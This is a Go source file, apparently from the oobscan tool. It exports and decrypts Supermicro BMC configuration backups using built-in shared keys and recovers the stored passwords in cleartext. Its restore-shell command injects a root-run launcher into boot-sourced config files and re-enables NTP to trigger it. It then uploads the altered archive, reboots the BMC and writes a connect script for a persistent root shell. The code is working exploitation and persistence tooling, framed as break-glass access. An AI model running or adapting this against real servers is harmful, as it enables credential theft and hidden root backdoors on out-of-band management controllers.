package cmd

// CLI wiring for the Supermicro/ATEN OEM config backup + restore-shell
// workflow. The protocol, crypto, archive rebuild, and payload generation live
// in pkg/ipmi/smcbackup.go; this file resolves keys, drives the session, and
// writes local artifacts.

import (
	"bytes"
	"context"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/runZeroInc/oobscan/pkg/ipmi"
)

// armNTPConf flips the leading `#enable` marker in ntp.conf to `enable` so the
// FW ~3.5x ntp_service.sh boot path runs ntpdate and then ddns_update.sh (which
// sources the DDNS_CONFIG payload). Only the enable marker line is touched; the
// configured servers and restrict lines are preserved verbatim.
func armNTPConf(ntp []byte) []byte {
	lines := bytes.Split(ntp, []byte("\n"))
	for i, ln := range lines {
		if bytes.Equal(bytes.TrimSpace(ln), []byte("#enable")) {
			lines[i] = []byte("enable")
			return bytes.Join(lines, []byte("\n"))
		}
	}
	return ntp
}

// shellSyntaxCheck runs `sh -n` over a config member that the BMC `source`s as
// root at boot, so a malformed rebuild is caught here rather than by breaking
// that boot script on the target (for netconfig0, the network bring-up). It
// only parses; it never executes the payload. A missing /bin/sh is treated as a
// pass (nothing to validate with), not a hard failure.
func shellSyntaxCheck(payload []byte) error {
	sh, err := exec.LookPath("sh")
	if err != nil {
		return nil
	}
	f, err := os.CreateTemp("", "oob-smcshell-*.sh")
	if err != nil {
		return nil
	}
	defer os.Remove(f.Name())
	if _, werr := f.Write(payload); werr != nil {
		f.Close()
		return nil
	}
	f.Close()
	out, err := exec.Command(sh, "-n", f.Name()).CombinedOutput()
	if err != nil {
		return fmt.Errorf("%v: %s", err, strings.TrimSpace(string(out)))
	}
	return nil
}

const (
	// smcShellCertLockTimeout bounds how long loadOrCreateSMCShellClientCert
	// waits on another process's lock before giving up.
	smcShellCertLockTimeout = 10 * time.Second
	// smcShellCertLockStale is how old a lock file must be before it is
	// treated as abandoned by a crashed process rather than actively held.
	// Generation+write takes well under a second, so anything holding the
	// lock this long is not making progress.
	smcShellCertLockStale = 30 * time.Second
)

// applySMCChunk overrides the transfer chunk size from --chunk when set.
func applySMCChunk(x *ipmi.SMCConfigXfer) {
	if smcChunk > 0 {
		x.UploadChunk = smcChunk
		x.DownloadChunk = smcChunk
	}
}

// resolveSMCCrypto returns the cipher, key, and IV to use, honoring
// --config-cipher/--config-key/--config-iv overrides, otherwise detecting the
// generation and using the built-in fleet-shared profile. gen is reported for
// output ("" if a full override was given).
func resolveSMCCrypto(ctx context.Context, sess *ipmi.CmdSess) (key, iv []byte, cipher ipmi.SMCConfigCipher, gen string, err error) {
	// If any override is present, build the profile from overrides (falling
	// back to auto-detection only for the generation label).
	if smcConfigKey != "" || smcConfigCipher != "" || smcConfigIV != "" {
		cipher = ipmi.SMCConfigCipher(strings.ToLower(strings.TrimSpace(smcConfigCipher)))
		if cipher == "" {
			cipher = ipmi.SMCCipherAES128CBC
		}
		if smcConfigKey == "" {
			return nil, nil, cipher, "", fmt.Errorf("--config-cipher/--config-iv require --config-key")
		}
		key, err = hex.DecodeString(strings.TrimPrefix(smcConfigKey, "0x"))
		if err != nil {
			return nil, nil, cipher, "", fmt.Errorf("invalid --config-key: %w", err)
		}
		// Default IV by cipher: AES fixed IV, 3DES zero IV; --config-iv overrides.
		switch {
		case smcConfigIV != "":
			iv, err = hex.DecodeString(strings.TrimPrefix(smcConfigIV, "0x"))
			if err != nil {
				return nil, nil, cipher, "", fmt.Errorf("invalid --config-iv: %w", err)
			}
		case cipher == ipmi.SMCCipher3DESCBC:
			iv = make([]byte, 8)
		default:
			iv = ipmi.SMCObfuscationIV
		}
		return key, iv, cipher, "", nil
	}
	// Auto: detect generation from the System GUID and use the built-in profile.
	g, gerr := sess.SMCGeneration(ctx)
	if gerr != nil {
		return nil, nil, "", "", fmt.Errorf("could not detect generation (pass --config-key/--config-cipher): %w", gerr)
	}
	gen = g.Generation
	prof, ok := ipmi.SMCCryptoProfileForGeneration(gen)
	if !ok {
		return nil, nil, "", gen, fmt.Errorf("no built-in config profile for generation %q (model %q); pass --config-key and --config-cipher", gen, g.ModelPrefix)
	}
	return prof.Key, prof.IV, prof.Cipher, gen, nil
}

// smcFWIs35x reports whether the live target runs X9/X10 firmware 3.5x or 3.62,
// the generations whose config-restore copy list omits both syslog.conf and
// network/netconfig0 (verified live on .137, FW 3.53 and 3.62), and whose
// service.conf is `source`d outright rather than parsed as a KEY=VALUE export
// loop. It reads Get Device ID (unauthenticated, always available) and matches
// major 3 / minor 0x50-0x62 (3.5x + 3.62).
// On any error it returns false, which keeps the 4.00+ fallback order
// (netconfig0 ahead of DDNS_CONFIG) -- the safe default, since 4.00 does
// restore netconfig0.
func smcFWIs35x(sess *ipmi.CmdSess) bool {
	cc, data, err := sess.ExecRaw(ipmi.NetFnApp, ipmi.CmdGetDeviceID, nil)
	if err != nil || cc != 0x00 || len(data) < 4 {
		return false
	}
	major, minor := data[2], data[3]
	return major == 0x03 && minor >= 0x50 && minor <= 0x62
}

// defaultSMCShellCertPath returns the per-app cache location for the
// smc-restore-shell client identity:
//
//	$HOME/.cache/oobscan/smcrestore-shell.pem
func defaultSMCShellCertPath() string {
	return filepath.Join(userCacheDir(), "oobscan", "smcrestore-shell.pem")
}

// resolveSMCShellCertPath returns explicit when set, else the default cache path.
func resolveSMCShellCertPath(explicit string) string {
	if strings.TrimSpace(explicit) != "" {
		return explicit
	}
	return defaultSMCShellCertPath()
}

// loadOrCreateSMCShellClientCert reuses the client identity at path when it exists,
// so the mTLS key pinned into a prior smc-restore-shell deploy is not orphaned, and
// otherwise generates and saves a fresh one.
//
// Safe for concurrent invocations against the same path: without coordination each
// process would see the file missing, generate its own cert, and let the last writer
// win, leaving hosts pinned to certs that match neither the cache file nor each
// other. A lock file plus a double-checked read after acquiring it makes every
// concurrent caller converge on one cert.
func loadOrCreateSMCShellClientCert(path string) (cert *ipmi.SMCShellClientCert, created bool, err error) {
	if cert, rerr := readSMCShellClientCert(path); rerr == nil {
		return cert, false, nil
	} else if !os.IsNotExist(rerr) {
		return nil, false, rerr
	}

	unlock, lerr := acquireSMCShellCertLock(path)
	if lerr != nil {
		return nil, false, lerr
	}
	defer unlock()

	// Re-check: another process may have generated and written it while we
	// were waiting for the lock.
	if cert, rerr := readSMCShellClientCert(path); rerr == nil {
		return cert, false, nil
	} else if !os.IsNotExist(rerr) {
		return nil, false, rerr
	}

	cert, err = ipmi.GenerateSMCShellClientCert("")
	if err != nil {
		return nil, false, fmt.Errorf("generating client cert: %w", err)
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		return nil, false, fmt.Errorf("creating %s: %w", filepath.Dir(path), err)
	}
	combined := append(append([]byte{}, cert.CertPEM...), cert.KeyPEM...)
	if err := writeFileAtomic(path, combined, 0o600); err != nil {
		return nil, false, fmt.Errorf("writing %s: %w", path, err)
	}
	return cert, true, nil
}

// readSMCShellClientCert reads and parses the cert at path. The returned
// error preserves os.IsNotExist-ability when the file is simply missing, so
// callers can distinguish "not created yet" from a real read/parse failure.
func readSMCShellClientCert(path string) (*ipmi.SMCShellClientCert, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	cert, err := ipmi.ParseSMCShellClientCert(data)
	if err != nil {
		return nil, fmt.Errorf("existing cert at %s is unusable: %w", path, err)
	}
	return cert, nil
}

// acquireSMCShellCertLock creates path+".lock" exclusively as an advisory,
// cross-process mutex guarding first-time generation of the cert at path.
// Call the returned function to release it. A lock file older than
// smcShellCertLockStale is treated as abandoned (its owner crashed or was
// killed before cleaning up) and removed rather than waited out.
func acquireSMCShellCertLock(path string) (unlock func(), err error) {
	lockPath := path + ".lock"
	deadline := time.Now().Add(smcShellCertLockTimeout)
	for {
		fh, oerr := os.OpenFile(lockPath, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0o600)
		if oerr == nil {
			fh.Close()
			return func() { os.Remove(lockPath) }, nil
		}
		if !os.IsExist(oerr) {
			return nil, fmt.Errorf("creating lock %s: %w", lockPath, oerr)
		}
		if st, serr := os.Stat(lockPath); serr == nil && time.Since(st.ModTime()) > smcShellCertLockStale {
			os.Remove(lockPath)
			continue
		}
		if time.Now().After(deadline) {
			return nil, fmt.Errorf("timed out after %s waiting for lock %s (held by another oobscan process?)", smcShellCertLockTimeout, lockPath)
		}
		time.Sleep(50 * time.Millisecond)
	}
}

// writeFileAtomic writes data to a temp file in path's directory and renames
// it into place, so a concurrent reader never observes a partially written
// file (os.WriteFile alone truncates path before writing, leaving a window
// where readers see an empty or short file).
func writeFileAtomic(path string, data []byte, mode os.FileMode) error {
	tmp := fmt.Sprintf("%s.tmp-%d", path, os.Getpid())
	if err := os.WriteFile(tmp, data, mode); err != nil {
		return err
	}
	if err := os.Rename(tmp, path); err != nil {
		os.Remove(tmp)
		return err
	}
	return nil
}

// resolveSMCInnerPassword returns the password for the older-X10 inner
// openssl-enc config layer: --config-inner-pass when set, otherwise the built-in
// fleet-static default (public Supermicro X10 config-backup password).
func resolveSMCInnerPassword() []byte {
	if smcConfigInnerPass != "" {
		return []byte(smcConfigInnerPass)
	}
	return ipmi.SMCConfigInnerPassword
}

// peelSMCInnerLayer unwraps the older-X10 (FW ~3.5x) openssl-enc-salted inner
// config layer with the resolved password (built-in default, or
// --config-inner-pass override). A not-gzip result means the wrong password.
func peelSMCInnerLayer(salted []byte) (tgz []byte, ok bool, err error) {
	pass := resolveSMCInnerPassword()
	pt, gz, ierr := ipmi.SMCOpenSSLSaltedUnwrap(salted, pass)
	if ierr != nil {
		return nil, false, fmt.Errorf("inner openssl-enc unwrap failed: %w", ierr)
	}
	if !gz {
		return nil, false, fmt.Errorf("inner openssl-enc unwrapped, but result is not gzip (wrong inner password; override with --config-inner-pass)")
	}
	return pt, true, nil
}

func sanitizeHostForFile(host string) string {
	r := strings.NewReplacer("/", "_", ":", "_", "%", "_", "[", "", "]", "", " ", "_")
	s := r.Replace(host)
	if s == "" {
		s = "target"
	}
	return s
}

// runIPMISMCBackup exports the config and, when the key is known, decrypts it.
// Read-only against the BMC.
func runIPMISMCBackup(ctx context.Context, sess *ipmi.CmdSess, _ []string) (any, error) {
	host := sanitizeHostForFile(sess.Host())
	key, iv, cipher, gen, keyErr := resolveSMCCrypto(ctx, sess)

	xfer := ipmi.NewSMCConfigXfer(sess)
	applySMCChunk(xfer)
	blob, err := xfer.Export(ctx, ipmi.SMCFileTypeConfig)
	if err != nil {
		return nil, err
	}

	outPath := smcOut
	if outPath == "" {
		outPath = fmt.Sprintf("smc-backup-%s.bin", host)
	}
	if err := os.WriteFile(outPath, blob, 0o600); err != nil {
		return nil, fmt.Errorf("writing %s: %w", outPath, err)
	}

	res := map[string]any{
		"action":        "smc-backup",
		"generation":    gen,
		"cipher":        string(cipher),
		"encryptedFile": outPath,
		"encryptedSize": len(blob),
	}
	if ipmi.SMCLooksGzip(blob) {
		res["note"] = "exported blob is already gzip: this generation did not encrypt it"
	}

	// Decrypt if we have a key and the user did not opt out.
	if smcNoDecrypt {
		return res, nil
	}
	if key == nil {
		res["decrypt"] = fmt.Sprintf("skipped: %v", keyErr)
		return res, nil
	}
	pt, crcOK, derr := ipmi.SMCContainerUnwrap(blob, key, iv, cipher)
	if derr != nil {
		res["decrypt"] = fmt.Sprintf("failed: %v", derr)
		return res, nil
	}
	res["crcOK"] = crcOK
	res["plaintextIsGzip"] = ipmi.SMCLooksGzip(pt)
	// Older X10 firmware (FW ~3.5x) nests a second openssl-enc layer under the
	// obfuscation container: the CRC validates (our obfuscation key is right) but
	// the payload is an "Salted__" openssl blob, not a gzip tar. Flag it plainly -
	// the inner secret is firmware-derived and not carried in any 4.00+ image, so
	// the exported .bin is still saved but cannot be opened without that key.
	if crcOK && ipmi.SMCLooksOpenSSLSalted(pt) {
		// Older X10 firmware (FW ~3.5x) nests a second openssl-enc layer under the
		// obfuscation container. Peel it with the built-in fleet-static password
		// (or --config-inner-pass override) and continue as if the container had
		// yielded the tar directly.
		res["innerFormat"] = "openssl-enc-salted"
		inner, ok, ierr := peelSMCInnerLayer(pt)
		if ierr != nil {
			res["decrypt"] = ierr.Error()
			saltedOut := strings.TrimSuffix(outPath, ".bin") + ".openssl-salted.bin"
			if werr := os.WriteFile(saltedOut, pt, 0o600); werr == nil {
				res["innerBlobFile"] = saltedOut
			}
			return res, nil
		}
		_ = ok
		res["innerDecrypted"] = true
		pt = inner
	}
	if !crcOK && !ipmi.SMCLooksGzip(pt) {
		res["decrypt"] = "wrong key: CRC mismatch and output is not gzip"
		return res, nil
	}
	tgz := strings.TrimSuffix(outPath, ".bin") + ".tar.gz"
	if err := os.WriteFile(tgz, pt, 0o600); err != nil {
		return nil, fmt.Errorf("writing %s: %w", tgz, err)
	}
	res["decryptedFile"] = tgz
	res["decryptedSize"] = len(pt)
	if names, nerr := ipmi.SMCArchiveMemberNames(pt); nerr == nil {
		res["members"] = len(names)
	}
	// The export is only half the story. Every stored password inside it is
	// held under one firmware-static key, so recovering them needs no further
	// access and belongs in the same output rather than in a separate step.
	if creds, cerr := ipmi.SMCRecoverPasswords(pt); cerr == nil && len(creds) > 0 {
		res["recoveredPasswords"] = len(creds)
		res["passwords"] = creds
	}
	return res, nil
}

// runIPMISMCRestoreShell rebuilds the config archive with a persistent
// cert-authenticated root shell service and restores it. Requires the config
// key (built-in for X11, or --config-key). Without --apply it only stages the
// upload; --apply commits and reboots the BMC.
func runIPMISMCRestoreShell(ctx context.Context, sess *ipmi.CmdSess, _ []string) (any, error) {
	if strings.TrimSpace(smcPayloadHost) == ipmi.SMCShellHostnameDHCPName {
		return nil, fmt.Errorf("hostname_for_dhcp deployment is unsupported: break-glass access requires certificate-authenticated stunnel; the unauthenticated Telnet fallback is disabled")
	}
	host := sanitizeHostForFile(sess.Host())
	key, iv, cipher, gen, keyErr := resolveSMCCrypto(ctx, sess)
	if key == nil {
		return nil, keyErr
	}

	// 1. Obtain the base decrypted archive: from --from, or export live.
	// innerPass is non-empty when this unit's config carries the older X10
	// (FW ~3.5x) openssl-enc-salted inner layer; the rebuilt archive is
	// re-wrapped with it symmetrically before upload (step 5).
	var baseTGZ []byte
	var innerPass []byte
	if smcFrom != "" {
		b, err := os.ReadFile(smcFrom)
		if err != nil {
			return nil, fmt.Errorf("reading --from %s: %w", smcFrom, err)
		}
		if !ipmi.SMCLooksGzip(b) {
			// Might be an encrypted blob; try to unwrap it.
			pt, crcOK, derr := ipmi.SMCContainerUnwrap(b, key, iv, cipher)
			if derr != nil || (!crcOK && !ipmi.SMCLooksGzip(pt)) {
				return nil, fmt.Errorf("--from is neither a gzip tar nor a decryptable backup for this key")
			}
			b = pt
		}
		// --from may itself still be the inner openssl-enc blob.
		if ipmi.SMCLooksOpenSSLSalted(b) {
			pt, ok, ierr := peelSMCInnerLayer(b)
			if ierr != nil {
				return nil, fmt.Errorf("--from: %w", ierr)
			}
			b, innerPass = pt, resolveSMCInnerPassword()
			_ = ok
		}
		baseTGZ = b
		// A --from that is already a decrypted gzip tar carries no inner-layer
		// signal, but on FW 3.5x/3.62 the unit is still double-encrypted. Recover
		// that from the target's reported firmware version so the shell-script
		// route stays accurate rather than falling through to a bare injection.
		if innerPass == nil && smcFWIs35x(sess) {
			innerPass = resolveSMCInnerPassword()
		}
	} else {
		xfer := ipmi.NewSMCConfigXfer(sess)
		applySMCChunk(xfer)
		blob, err := xfer.Export(ctx, ipmi.SMCFileTypeConfig)
		if err != nil {
			return nil, fmt.Errorf("exporting base config: %w", err)
		}
		pt, crcOK, derr := ipmi.SMCContainerUnwrap(blob, key, iv, cipher)
		if derr != nil {
			return nil, fmt.Errorf("decrypting base config: %w", derr)
		}
		if crcOK && ipmi.SMCLooksOpenSSLSalted(pt) {
			inner, ok, ierr := peelSMCInnerLayer(pt)
			if ierr != nil {
				return nil, ierr
			}
			_ = ok
			pt, innerPass = inner, resolveSMCInnerPassword()
		} else if !crcOK && !ipmi.SMCLooksGzip(pt) {
			return nil, fmt.Errorf("decrypting base config: wrong key (CRC mismatch, not gzip)")
		}
		baseTGZ = pt
	}

	// 2. Choose the payload host member. Prefer syslog.conf, which slogd sources as
	// root at boot on 4.00/X11/H13. Older X10 firmware does not restore an added
	// syslog.conf and parses rather than sources service.conf, so fall back to
	// network/netconfig0 there: the one member that is both restored and sourced as
	// root at boot. Only members that already exist are auto-selected, because an
	// added member is absent from that firmware's restore copy list and would stay
	// inert. See kb/smc/notes/x10-fw353-openssl-salted-config.md.
	//
	// --payload-host overrides the selection and may name a member not yet in the
	// config, which is then added. That is a diagnostic and persists only if the name
	// is in this firmware's restore copy list.
	targetName := ipmi.SMCShellSyslogConfName
	forced := strings.TrimSpace(smcPayloadHost)
	if forced != "" {
		targetName = forced
	}
	cur, haveTarget, err := ipmi.SMCArchiveMember(baseTGZ, targetName)
	if err != nil {
		return nil, fmt.Errorf("reading %s from base archive: %w", targetName, err)
	}
	// Fallback chain for older X10: syslog.conf is preferred, but FW ~3.5x omits
	// it from the restore copy list. On 3.5x (detected by the openssl-salted inner
	// layer, innerPass != nil) netconfig0 is present in the backup but NOT actually
	// restored (verified live on .137: it came back byte-identical), so prefer
	// ddns/DDNS_CONFIG, which 3.5x both restores and sources as root. On 4.00 (raw
	// tar, no inner layer) netconfig0 IS restored, so keep it ahead there. Only
	// members already present are auto-selected: an added member is absent from
	// that firmware's restore copy list and would stay inert.
	if forced == "" && !haveTarget {
		chain := []string{ipmi.SMCShellNetconfigName, ipmi.SMCShellDDNSName, ipmi.SMCShellServiceName}
		// Older firmware parses service.conf as a KEY=VALUE export loop (inert for
		// an appended-shell payload); only 3.5x/3.62 sources it outright (live on
		// .137). Isolated tar --from builds need the live target's FW version to
		// pick payload ranking; evaluate once and prefer service.conf on any
		// 3.5x/3.62 board, netconfig0 on the 3.93/4.00-only socket.
		serviceFirst := innerPass != nil || smcFWIs35x(sess)
		if serviceFirst {
			chain = []string{ipmi.SMCShellServiceName, ipmi.SMCShellDDNSName, ipmi.SMCShellNetconfigName}
		}
		for _, cand := range chain {
			if c, ok, cerr := ipmi.SMCArchiveMember(baseTGZ, cand); cerr == nil && ok {
				targetName, cur, haveTarget = cand, c, true
				break
			}
		}
	}
	if forced == "" && !haveTarget {
		return nil, fmt.Errorf("no supported stunnel deployment member in this config: none of %s, %s, %s or %s is present (unauthenticated shell fallbacks are disabled)", ipmi.SMCShellSyslogConfName, ipmi.SMCShellNetconfigName, ipmi.SMCShellDDNSName, ipmi.SMCShellServiceName)
	}
	// Seed a fresh syslog.conf with the stock slogd variables so the daemon that
	// `source`s it does not trip on undefined SLOG_SERVICE after our launcher runs.
	if !haveTarget && targetName == ipmi.SMCShellSyslogConfName {
		cur = []byte("PORT1=514\nPORT2=0\nPORT3=0\nIP1=\nIP2=\nIP3=\nSLOG_SERVICE=0\n")
	}

	// 3. Pinned client identity (reused from the cache when present) + payload.
	certPath := resolveSMCShellCertPath(smcCertPath)
	clientCert, certCreated, err := loadOrCreateSMCShellClientCert(certPath)
	if err != nil {
		return nil, err
	}
	svc := ipmi.SMCShellService{
		Port:          smcShellPort,
		StartDelaySec: smcShellDelay,
		CACertPEM:     clientCert.CertPEM,
	}
	dbgsvcConf := ipmi.BuildSMCShellServiceConf(svc)
	// The launcher is appended to an existing, root-sourced config member (written
	// to tmpfs at boot), preserving that member's own variables. netconfig0 and
	// DDNS_CONFIG use a backgrounded-subshell wrapper so the launcher cannot
	// disturb the boot script that sources them right after.
	var payloadConf []byte
	switch targetName {
	case ipmi.SMCShellNetconfigName:
		payloadConf = ipmi.BuildSMCShellNetconfig(cur, dbgsvcConf)
	case ipmi.SMCShellDDNSName:
		payloadConf = ipmi.BuildSMCShellDDNSConf(cur, dbgsvcConf)
	case ipmi.SMCShellServiceName:
		// service.conf is `source`d outright on X9 3.5x/3.62 (not a hardened
		// KEY=VALUE loop), so the syslog.conf-style appended launcher executes.
		payloadConf = ipmi.BuildSMCShellSyslogConf(cur, dbgsvcConf)
	default:
		payloadConf = ipmi.BuildSMCShellSyslogConf(cur, dbgsvcConf)
	}

	// Validate the root-sourced member before upload to avoid breaking BMC startup.
	if err := shellSyntaxCheck(payloadConf); err != nil {
		return nil, fmt.Errorf("internal: rebuilt %s failed `sh -n` syntax check (refusing to upload): %w", targetName, err)
	}

	// 4. Rebuild the archive, touching only the payload member. Replace it if it
	// already exists, else Add it (only reachable with --payload-host forcing a
	// member not yet in the config). The launcher block is idempotent -- the
	// builders strip any prior block on re-deploy.
	edit := ipmi.SMCArchiveEdit{
		Replace: map[string][]byte{},
		Add:     map[string][]byte{},
	}
	if haveTarget {
		edit.Replace[targetName] = payloadConf
	} else {
		edit.Add[targetName] = payloadConf
	}
	// The DDNS_CONFIG host is only sourced when ddns_update.sh runs, and on FW
	// ~3.5x ntp_service.sh calls it only after a successful NTP sync. If NTP is
	// disabled (`#enable`), the boot path never reaches the source and the payload
	// stays inert (verified live on .137). ntp/ntp.conf is in the restore copy
	// list, so flip `#enable` -> `enable` to arm the boot path. This starts the
	// vendor ntpd against the configured servers; it does not touch addressing.
	if targetName == ipmi.SMCShellDDNSName {
		if ntp, ok, nerr := ipmi.SMCArchiveMember(baseTGZ, "ntp/ntp.conf"); nerr == nil && ok {
			if armed := armNTPConf(ntp); !bytes.Equal(armed, ntp) {
				edit.Replace["ntp/ntp.conf"] = armed
			}
		}
	}
	rebuilt, report, err := ipmi.SMCRebuildArchive(baseTGZ, edit)
	if err != nil {
		return nil, fmt.Errorf("rebuilding archive: %w", err)
	}

	// 5. Encrypt and self-check the round trip before uploading. When the unit
	// uses the older X10 inner openssl-enc layer, re-apply it symmetrically
	// (obfuscation wraps the openssl-enc blob, as the firmware produced it).
	// --raw-inner is a diagnostic that skips the inner layer, uploading a raw
	// gzip tar under obfuscation: on FW ~3.5x this exercises restore_file.sh's
	// raw-tar fallback path (`tar zxvf $TARGET_FILE`), to test whether the restore
	// persists an unencrypted archive when the inner-encrypted one did not.
	inner := rebuilt
	rawInner := innerPass != nil && smcRawInner
	if innerPass != nil && !smcRawInner {
		inner, err = ipmi.SMCOpenSSLSaltedWrap(rebuilt, innerPass)
		if err != nil {
			return nil, fmt.Errorf("re-encrypting inner openssl-enc layer: %w", err)
		}
	}
	ct, err := ipmi.SMCContainerWrap(inner, key, iv, cipher)
	if err != nil {
		return nil, fmt.Errorf("encrypting archive: %w", err)
	}
	// Self-check: unwrap the obfuscation layer, then (if present) the inner layer,
	// and confirm we recover the gzip tar.
	pt, crcOK, uerr := ipmi.SMCContainerUnwrap(ct, key, iv, cipher)
	if uerr != nil || !crcOK {
		return nil, fmt.Errorf("internal: re-encrypted archive failed self-check (crcOK=%v err=%v)", crcOK, uerr)
	}
	if innerPass != nil && !rawInner {
		if p2, gz, e2 := ipmi.SMCOpenSSLSaltedUnwrap(pt, innerPass); e2 != nil || !gz {
			return nil, fmt.Errorf("internal: inner-layer self-check failed (gzip=%v err=%v)", gz, e2)
		} else {
			pt = p2
		}
	}
	if !ipmi.SMCLooksGzip(pt) {
		return nil, fmt.Errorf("internal: re-encrypted archive self-check: recovered payload is not gzip")
	}

	// 6. Write local artifacts (client identity + connect helper).
	outDir := smcOut
	if outDir == "" {
		outDir = fmt.Sprintf("smc-shell-%s", host)
	}
	if err := os.MkdirAll(outDir, 0o700); err != nil {
		return nil, fmt.Errorf("creating %s: %w", outDir, err)
	}
	writes := map[string][]byte{
		"config.encrypted.bin": ct,
		"connect.sh":           smcConnectScript(sess.Host(), smcShellPort, certPath),
		"dbgsvc.conf.deployed": dbgsvcConf,
	}
	for name, data := range writes {
		mode := os.FileMode(0o600)
		if name == "connect.sh" {
			mode = 0o700
		}
		if err := os.WriteFile(filepath.Join(outDir, name), data, mode); err != nil {
			return nil, fmt.Errorf("writing %s: %w", name, err)
		}
	}

	opensslConnect := fmt.Sprintf("openssl s_client -connect %s:%d -cert %s -quiet", sess.Host(), smcShellPort, certPath)

	res := map[string]any{
		"action":            "smc-restore-shell",
		"generation":        gen,
		"cipher":            string(cipher),
		"shellPort":         smcShellPort,
		"clientCN":          clientCert.CommonName,
		"clientFingerprint": clientCert.Fingerprint,
		"certPath":          certPath,
		"certReused":        !certCreated,
		"payloadHost":       targetName,
		"rawInner":          rawInner,
		"artifactDir":       outDir,
		"archiveAppended":   report.Appended,
		"archiveAdded":      report.Added,
		"archiveReplaced":   report.Replaced,
		"archiveUnchanged":  report.Unchanged,
		"encryptedSize":     len(ct),
		"opensslConnect":    opensslConnect,
	}

	// 7. Stage the upload.
	xfer := ipmi.NewSMCConfigXfer(sess)
	applySMCChunk(xfer)
	rid, err := xfer.Upload(ctx, ct)
	if err != nil {
		return nil, fmt.Errorf("uploading archive: %w", err)
	}
	res["reservationID"] = fmt.Sprintf("0x%04x", rid)

	if !smcApply {
		res["applied"] = false
		res["note"] = "staged only; pass --apply to commit (that restores the config and reboots the BMC)"
		return res, nil
	}

	// 8. Commit. The BMC cold-resets immediately, so a transport error on the
	// apply reply is expected, not a failure.
	cc, aerr := xfer.Apply(ctx, rid, ipmi.SMCFileTypeConfig)
	res["applied"] = true
	if aerr != nil {
		res["applyReply"] = fmt.Sprintf("no reply (expected: BMC is rebooting): %v", aerr)
	} else {
		res["applyReply"] = fmt.Sprintf("cc=0x%02x", cc)
	}
	res["connect"] = fmt.Sprintf("%s   (after the BMC reboots + %ds service delay; also saved as %s/connect.sh)", opensslConnect, smcShellDelay, outDir)
	return res, nil
}

func smcConnectScript(host string, port int, certPath string) []byte {
	return fmt.Appendf(nil, `#!/bin/bash
# oobscan smc-restore-shell: client-certificate-authenticated root shell connector.
# Usage: ./connect.sh [host] [port]   (commands on stdin run as root on the BMC)
HOST=${1:-%s}
PORT=${2:-%d}
exec openssl s_client -connect "$HOST:$PORT" -cert %s -quiet
`, host, port, certPath)
}
